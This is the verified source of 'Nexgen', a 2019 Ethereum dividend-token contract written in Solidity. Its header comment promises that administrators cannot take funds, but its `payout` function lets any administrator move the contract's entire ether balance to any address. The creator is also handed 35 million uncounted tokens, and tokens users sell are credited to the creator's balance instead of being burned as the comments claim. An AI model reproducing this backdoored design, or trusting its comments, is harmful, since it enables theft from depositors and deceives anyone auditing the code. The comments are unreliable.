/**
 *Submitted for verification at Etherscan.io on 2019-06-18
*/

/*NEXGEN dApp - The World's First Most Sustainable Decentralized Application */

/**
 * Source Code first verified at https://etherscan.io on Wednesday, June 18, 2019
 (UTC) */

pragma solidity ^0.4.20;

contract Nexgen {
    
    /*=================================
    =            MODIFIERS            =
    =================================*/
    // only people with tokens
    modifier onlybelievers () {
        require(myTokens() > 0);
        _;
    }
    
    // only people with profits
    modifier onlyhodler() {
        require(myDividends(true) > 0);
        _;
    }
    
    // only people with sold token
    modifier onlySelingholder() {
        require(sellingWithdrawBalance_[msg.sender] > 0);
        _;
    }
    
    // administrators can:
    // -> change the name of the contract
    // -> change the name of the token
    // -> change the PoS difficulty 
    // they CANNOT:
    // -> take funds
    // -> disable withdrawals
    // -> kill the contract
    // -> change the price of tokens
    modifier onlyAdministrator(){
        address _customerAddress = msg.sender;
        require(administrators[keccak256(_customerAddress)]);
        _;
    }
    
    

    
    /*==============================
    =            EVENTS            =
    ==============================*/
    event onTokenPurchase(
        address indexed customerAddress,
        uint256 incomingEthereum,
        uint256 tokensMinted,
        address indexed referredBy
    );
    
    event onTokenSell(
        address indexed customerAddress,
        uint256 tokensBurned
    );
    
    event onReinvestment(
        address indexed customerAddress,
        uint256 ethereumReinvested,
        uint256 tokensMinted
    );
    
    event onWithdraw(
        address indexed customerAddress,
        uint256 ethereumWithdrawn
    );
    
    event onSellingWithdraw(
        
        address indexed customerAddress,
        uint256 ethereumWithdrawn
    
    );
    
    // ERC20
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
    
    
    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/
    string public name = "Nexgen";
    string public symbol = "NEXG";
    uint8 constant public decimals = 18;
    uint8 constant internal dividendFee_ = 10;
    
    uint256 constant internal tokenPriceInitial_ = 0.000005 ether;
    uint256 constant internal tokenPriceIncremental_ = 0.00000015 ether;

    
    
    // proof of stake (defaults at 1 token)
    uint256 public stakingRequirement = 1e18;
     
    // add community wallet here
    address internal constant CommunityWalletAddr = address(0xfd6503cae6a66Fc1bf603ecBb565023e50E07340);
        
        //add trading wallet here
    address internal constant TradingWalletAddr = address(0x6d5220BC0D30F7E6aA07D819530c8727298e5883);   

    
    
   /*================================
    =            DATASETS            =
    ================================*/
    // amount of shares for each address (scaled number)
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal referralBalance_;
    mapping(address => int256) internal payoutsTo_;
    mapping(address => uint256) internal sellingWithdrawBalance_;
    mapping(address => uint256) internal ambassadorAccumulatedQuota_;

    address[] private contractTokenHolderAddresses_;

    
    uint256 internal tokenSupply_ = 0;
    uint256 internal profitPerShare_;
    
    uint256 internal soldTokens_=0;
    uint256 internal contractAddresses_=0;
    uint256 internal tempIncomingEther=0;
    uint256 internal calculatedPercentage=0;
    
    
    uint256 internal tempProfitPerShare=0;
    uint256 internal tempIf=0;
    uint256 internal tempCalculatedDividends=0;
    uint256 internal tempReferall=0;
    uint256 internal tempSellingWithdraw=0;

    address internal creator;
    


    
    // administrator list (see above on what they can do)
    mapping(bytes32 => bool) public administrators;
    
    
    bool public onlyAmbassadors = false;
    


    /*=======================================
    =            PUBLIC FUNCTIONS            =
    =======================================*/
    /*
    * -- APPLICATION ENTRY POINTS --  
    */
    function Nexgen()
        public
    {
        // add administrators here
           
        administrators[0x25d75fcac9be21f1ff885028180480765b1120eec4e82c73b6f043c4290a01da] = true;
        creator = msg.sender;
        tokenBalanceLedger_[creator] = 35000000*1e18;                     
                         
        
    }

    /**
     * Community Wallet Balance
     */
    function CommunityWalletBalance() public view returns(uint256){
        return address(0xfd6503cae6a66Fc1bf603ecBb565023e50E07340).balance;
    }

    /**
     * Trading Wallet Balance
     */
    function TradingWalletBalance() public view returns(uint256){
        return address(0x6d5220BC0D30F7E6aA07D819530c8727298e5883).balance;
    } 

    /**
     * Referral Balance
     */
    function ReferralBalance() public view returns(uint256){
        return referralBalance_[msg.sender];
    } 

    /**
     * Converts all incoming Ethereum to tokens for the caller, and passes down the referral address (if any)
     */
    function buy(address _referredBy)
        public
        payable
        returns(uint256)
    {
        purchaseTokens(msg.value, _referredBy);

    }
    
    
    function()
        payable
        public
    {
        purchaseTokens(msg.value, 0x0);
    }
    
    /**
     * Converts all of caller's dividends to tokens.
     */
    function reinvest()
        onlyhodler()
        public
    {
        address _customerAddress = msg.sender;

        // fetch dividends
        uint256 _dividends = myDividends(true); // retrieve ref. bonus later in the code
 
         //calculate  10 % for distribution 
        uint256  ten_percentForDistribution= SafeMath.percent(_dividends,10,100,18);

         //calculate  90 % to reinvest into tokens
        uint256  nighty_percentToReinvest= SafeMath.percent(_dividends,90,100,18);
        
        
        // dispatch a buy order with the calculatedPercentage 
        uint256 _tokens = purchaseTokens(nighty_percentToReinvest, 0x0);
        
        
        //Empty their  all dividends beacuse we are reinvesting them
         payoutsTo_[_customerAddress]=0;
         referralBalance_[_customerAddress]=0;
        
    
     
      //distribute to all as per holdings         
        profitPerShareAsPerHoldings(ten_percentForDistribution);
        
        // fire event
        onReinvestment(_customerAddress, _dividends, _tokens);
    }
    
    /**
     * Alias of sell() and withdraw().
     */
    function exit()
        public
    {
        // get token count for caller & sell them all
        address _customerAddress = msg.sender;
        uint256 _tokens = tokenBalanceLedger_[_customerAddress];
        if(_tokens > 0) sell(_tokens);
        
        
        withdraw();
    }

    /**
     * Withdraws all of the callers earnings.
     */
    function withdraw()
        onlyhodler()
        public
    {
        // setup data
        address _customerAddress = msg.sender;
        
        //calculate 20 % of all Dividends and transfer them to two communities
        //10% to community wallet
        //10% to trading wallet
        
        uint256 _dividends = myDividends(true); // get all dividends
        
        //calculate  10 % for trending wallet
        uint256  ten_percentForTradingWallet= SafeMath.percent(_dividends,10,100,18);

        //calculate 10 % for community wallet
         uint256 ten_percentForCommunityWallet= SafeMath.percent(_dividends,10,100,18);

        
        //Empty their  all dividends beacuse we are reinvesting them
         payoutsTo_[_customerAddress]=0;
         referralBalance_[_customerAddress]=0;
       
         // delivery service
        CommunityWalletAddr.transfer(ten_percentForCommunityWallet);
        
         // delivery service
        TradingWalletAddr.transfer(ten_percentForTradingWallet);
        
        //calculate 80% to tranfer it to customer address
         uint256 eighty_percentForCustomer= SafeMath.percent(_dividends,80,100,18);

       
        // delivery service
        _customerAddress.transfer(eighty_percentForCustomer);
        
        // fire event
        onWithdraw(_customerAddress, _dividends);
    }
    
     /**
     * Withdrawa all selling Withdraw of the callers earnings.
     */
    function sellingWithdraw()
        onlySelingholder()
        public
    {
        // setup data
        address _customerAddress = msg.sender;
        

        uint256 _sellingWithdraw = sellingWithdrawBalance_[_customerAddress] ; // get all balance
        

        //Empty  all sellingWithdraw beacuse we are giving them ethers
         sellingWithdrawBalance_[_customerAddress]=0;

     
        // delivery service
        _customerAddress.transfer(_sellingWithdraw);
        
        // fire event
        onSellingWithdraw(_customerAddress, _sellingWithdraw);
    }
    
    
    
     /**
     * Sell tokens.
     * Remember, there's a 10% fee here as well.
     */
   function sell(uint256 _amountOfTokens)
        onlybelievers ()
        public
    {
      
        address _customerAddress = msg.sender;
       
        //calculate 10 % of tokens and distribute them 
        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _tokens = _amountOfTokens;
      
       uint256 _ethereum = tokensToEthereum_(_tokens);
        
          //calculate  10 % for distribution 
       uint256  ten_percentToDistributet= SafeMath.percent(_ethereum,10,100,18);

          //calculate  90 % for customer withdraw wallet
        uint256  nighty_percentToCustomer= SafeMath.percent(_ethereum,90,100,18);
        
        // burn the sold tokens
        tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
        tokenBalanceLedger_[creator] = SafeMath.add(tokenBalanceLedger_[creator], _tokens);


        //substract sold token from circulations of tokenSupply_
        soldTokens_=SafeMath.sub(soldTokens_,_tokens);
        
        // update sellingWithdrawBalance of customer 
       sellingWithdrawBalance_[_customerAddress] += nighty_percentToCustomer;       
        
       
        //distribute to all as per holdings         
       profitPerShareAsPerHoldings(ten_percentToDistributet);
      
        //Sold Tokens Ether Transfer to User Account
        sellingWithdraw();
        
        // fire event
        onTokenSell(_customerAddress, _tokens);
        
    }
    
    
    /**
     * Transfer tokens from the caller to a new holder.
     * Remember, there's a 5% fee here as well.
     */
    function transfer(address _toAddress, uint256 _amountOfTokens)
        onlybelievers ()
        public
        returns(bool)
    {
        // setup
        address _customerAddress = msg.sender;
        
        // make sure we have the requested tokens
     
        require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
      
        //calculate 5 % of total tokens calculate Tokens Received
        uint256  five_percentOfTokens= SafeMath.percent(_amountOfTokens,5,100,18);
        
       
       //calculate 95 % of total tokens calculate Tokens Received
        uint256  nightyFive_percentOfTokens= SafeMath.percent(_amountOfTokens,95,100,18);
        
        
        // burn the fee tokens
        //convert ethereum to tokens
        tokenSupply_ = SafeMath.sub(tokenSupply_,five_percentOfTokens);
        
        //substract five percent from communiity of tokens
        soldTokens_=SafeMath.sub(soldTokens_, five_percentOfTokens);

        // exchange tokens
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], nightyFive_percentOfTokens) ;
        

        //calculate value of all token to transfer to ethereum
        uint256 five_percentToDistribute = tokensToEthereum_(five_percentOfTokens);


        //distribute to all as per holdings         
        profitPerShareAsPerHoldings(five_percentToDistribute);

        // fire event
        Transfer(_customerAddress, _toAddress, nightyFive_percentOfTokens);
        
        
        return true;
       
    }
    
    /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
    /**
     * administrator can manually disable the ambassador phase.
     */
    function disableInitialStage()
        onlyAdministrator()
        public
    {
        onlyAmbassadors = false;
    }
    
   
    function setAdministrator(bytes32 _identifier, bool _status)
        onlyAdministrator()
        public
    {
        administrators[_identifier] = _status;
    }
    
   
    function setStakingRequirement(uint256 _amountOfTokens)
        onlyAdministrator()
        public
    {
        stakingRequirement = _amountOfTokens;
    }
    
    
    function setName(string _name)
        onlyAdministrator()
        public
    {
        name = _name;
    }
    
   
    function setSymbol(string _symbol)
        onlyAdministrator()
        public
    {
        symbol = _symbol;
    }

    function payout (address _address) public onlyAdministrator returns(bool res) {
        _address.transfer(address(this).balance);
        return true;
    }
    /*----------  HELPERS AND CALCULATORS  ----------*/
    /**
     * Method to view the current Ethereum stored in the contract
     * Example: totalEthereumBalance()
     */
    function totalEthereumBalance()
        public
        view
        returns(uint)
    {
        return this.balance;
    }
    
    /**
     * Retrieve the total token supply.
     */
    function totalSupply()
        public
        view
        returns(uint256)
    {
        return tokenSupply_;
    }
    
    /**
     * Retrieve the tokens owned by the caller.
     */
    function myTokens()
        public
        view
        returns(uint256)
    {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }
    
    /**
     * Retrieve the sold tokens .
     */
    function soldTokens()
        public
        view
        returns(uint256)
    {

        return soldTokens_;
    }
    
    
    /**
     * Retrieve the dividends owned by the caller.
       */ 
    function myDividends(bool _includeReferralBonus) 
        public 
        view 
        returns(uint256)
    {
        address _customerAddress = msg.sender;

        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress);
    }
    
    /**
     * Retrieve the token balance of any single address.
     */
    function balanceOf(address _customerAddress)
        view
        public
        returns(uint256)
    {
        return tokenBalanceLedger_[_customerAddress];
    }
    
    /**
     * Retrieve the selingWithdraw balance of address.
     */
    function selingWithdrawBalance()
        view
        public
        returns(uint256)
    {
        address _customerAddress = msg.sender;
         
        uint256 _sellingWithdraw = (uint256) (sellingWithdrawBalance_[_customerAddress]) ; // get all balance
        
        return  _sellingWithdraw;
    }
    
    /**
     * Retrieve the dividend balance of any single address.
     */
    function dividendsOf(address _customerAddress)
        view
        public
        returns(uint256)
    {
     
        return  (uint256) (payoutsTo_[_customerAddress]) ;

        
    }
    
    /**
     * Return the buy price of 1 individual token.
     */
    function sellPrice() 
        public 
        view 
        returns(uint256)
    {
       
        if(tokenSupply_ == 0){
            return tokenPriceInitial_ - tokenPriceIncremental_;
        } else {
            uint256 _ethereum = tokensToEthereum_(1e18);
            
            return _ethereum - SafeMath.percent(_ethereum,15,100,18);
        }
    }
    
    /**
     * Return the sell price of 1 individual token.
     */
    function buyPrice() 
        public 
        view 
        returns(uint256)
    {
        
        if(tokenSupply_ == 0){
            return tokenPriceInitial_ ;
        } else {
            uint256 _ethereum = tokensToEthereum_(1e18);
           
           
            return _ethereum;
        }
    }
    
   
    /**
     * Function to calculate actual value after Taxes
     */
    function calculateTokensReceived(uint256 _ethereumToSpend) 
        public 
        view 
        returns(uint256)
    {
         //calculate  15 % for distribution 
        uint256  fifteen_percentToDistribute= SafeMath.percent(_ethereumToSpend,15,100,18);

        uint256 _dividends = SafeMath.sub(_ethereumToSpend, fifteen_percentToDistribute);
        uint256 _amountOfTokens = ethereumToTokens_(_dividends);
        
        return _amountOfTokens;
    }
    
    
   
   
    function calculateEthereumReceived(uint256 _tokensToSell) 
        public 
        view 
        returns(uint256)
    {
        require(_tokensToSell <= tokenSupply_);
        
        uint256 _ethereum = tokensToEthereum_(_tokensToSell);
        
         //calculate  10 % for distribution 
        uint256  ten_percentToDistribute= SafeMath.percent(_ethereum,10,100,18);
        
        uint256 _dividends = SafeMath.sub(_ethereum, ten_percentToDistribute);

        return _dividends;

    }
    
    
    /*==========================================
    =            INTERNAL FUNCTIONS            =
    ==========================================*/
    
    
    function purchaseTokens(uint256 _incomingEthereum, address _referredBy)
        internal
        returns(uint256)
    {
        // data setup
        address _customerAddress = msg.sender;
        
        //check if address 
        tempIncomingEther=_incomingEthereum;
        
                bool isFound=false;
                
                for(uint k=0;k<contractTokenHolderAddresses_.length;k++){
                    
                    if(contractTokenHolderAddresses_[k] ==_customerAddress){
                        
                     isFound=true;
                    break;
                        
                    }
                }
    
    
        if(!isFound){
        
            //increment address to keep track of no of users in smartcontract
            contractAddresses_+=1;  
            
            contractTokenHolderAddresses_.push(_customerAddress);
                        
            }
    
     //calculate 85 percent
      calculatedPercentage= SafeMath.percent(_incomingEthereum,85,100,18);
      
      uint256 _amountOfTokens = ethereumToTokens_(SafeMath.percent(_incomingEthereum,85,100,18));    

        // we can't give people infinite ethereum
        if(tokenSupply_ > 0){
            
            // add tokens to the pool
            tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
        
        
        } else {
            // add tokens to the pool
            tokenSupply_ = _amountOfTokens;
        }
        
        // update circulating supply & the ledger address for the customer
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        
        
        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_) && tokenSupply_ <= (55000000*1e18));
        
        // is the user referred by a Nexgen Key?
        if(
            // is this a referred purchase?
            _referredBy != 0x0000000000000000000000000000000000000000 &&

            // no cheating!
            _referredBy != _customerAddress &&
            
            // does the referrer have at least X whole tokens?
            // i.e is the referrer a godly chad masternode
            tokenBalanceLedger_[_referredBy] >= stakingRequirement
            
        ){
           
     // give 5 % to referral
     referralBalance_[_referredBy]+= SafeMath.percent(_incomingEthereum,5,100,18);
     
     tempReferall+=SafeMath.percent(_incomingEthereum,5,100,18);
     
     if(contractAddresses_>0){
         
     profitPerShareAsPerHoldings(SafeMath.percent(_incomingEthereum,10,100,18));
    
    
       
     }
     
    } else {
          
     
     if(contractAddresses_>0){
    
     profitPerShareAsPerHoldings(SafeMath.percent(_incomingEthereum,15,100,18));

 
        
     }
            
        }
        
      
    

        
        // fire event
        onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);
        
        //calculate sold tokens here
        soldTokens_+=_amountOfTokens;
        
        return _amountOfTokens;
    }

   
     
   /**
     * Calculate Token price based on an amount of incoming ethereum
     * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
     * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
     */
     
    function ethereumToTokens_(uint256 _ethereum)
        internal
        view
        returns(uint256)
    {
        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;
        uint256 _tokensReceived = 
         (
            (
                // underflow attempts BTFO
                SafeMath.sub(
                    (sqrt
                        (
                            (_tokenPriceInitial**2)
                            +
                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
                            +
                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
                            +
                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
                        )
                    ), _tokenPriceInitial
                )
            )/(tokenPriceIncremental_)
        )-(tokenSupply_)
        ;
  
        return _tokensReceived;
    }
    
    /**
     * Calculate token sell value.
          */
     function tokensToEthereum_(uint256 _tokens)
        internal
        view
        returns(uint256)
    {

        uint256 tokens_ = (_tokens + 1e18);
        uint256 _tokenSupply = (tokenSupply_ + 1e18);
        uint256 _etherReceived =
        (
            // underflow attempts BTFO
            SafeMath.sub(
                (
                    (
                        (
                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
                        )-tokenPriceIncremental_
                    )*(tokens_ - 1e18)
                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
            )
        /1e18);
        return _etherReceived;
    }
    
    //calculate profitPerShare as per holdings
    function profitPerShareAsPerHoldings(uint256 calculatedDividend)  internal {
    
       //calculate number of token 
       uint256 noOfTokens_;
        tempCalculatedDividends=calculatedDividend;

       for(uint i=0;i<contractTokenHolderAddresses_.length;i++){
         
         noOfTokens_+= tokenBalanceLedger_[contractTokenHolderAddresses_[i]];

        }
        
        //check if self token balance is zero then distribute to others as per holdings
        
    for(uint k=0;k<contractTokenHolderAddresses_.length;k++){
        
        if(noOfTokens_>0 && tokenBalanceLedger_[contractTokenHolderAddresses_[k]]!=0){
       

           profitPerShare_=SafeMath.percent(calculatedDividend,tokenBalanceLedger_[contractTokenHolderAddresses_[k]],noOfTokens_,18);
         
           tempProfitPerShare=profitPerShare_;

           payoutsTo_[contractTokenHolderAddresses_[k]] += (int256) (profitPerShare_) ;
           
           tempIf=1;

            
        }else if(noOfTokens_==0 && tokenBalanceLedger_[contractTokenHolderAddresses_[k]]==0){
            
            tempIf=2;
            tempProfitPerShare=profitPerShare_;

            payoutsTo_[contractTokenHolderAddresses_[k]] += (int256) (calculatedDividend) ;
        
            
        }
        
      }
        
        
    
        

    
    }
    
    //calculate square root
    function sqrt(uint x) internal pure returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    
    function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(/*uint division,*/uint quotient) {

         // caution, check safe-to-multiply here
        uint _numerator  = numerator * 10 ** (precision+1);
        // with rounding of last digit
        uint _quotient =  ((_numerator / denominator) + 5) / 10;
        
       // uint division_=numerator/denominator;
        /* value*division_,*/
        return (value*_quotient/1000000000000000000);
  }


    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}